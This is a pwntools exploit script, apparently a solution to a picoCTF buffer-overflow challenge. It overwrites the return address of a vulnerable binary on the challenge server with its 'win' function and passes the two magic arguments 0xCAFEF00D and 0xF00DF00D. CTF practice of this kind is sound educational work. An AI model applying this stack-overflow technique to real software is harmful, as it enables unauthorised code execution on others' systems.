from pwn import *

r = remote("saturn.picoctf.net", 61305)
# r = process("./vuln")
exe = ELF("./vuln")

r.recvuntil(b": \n")
payload = cyclic(0x70) + p32(exe.sym["win"]) + p32(0) + p32(0xCAFEF00D) + p32(0xF00DF00D)
r.sendline(payload)
r.interactive()
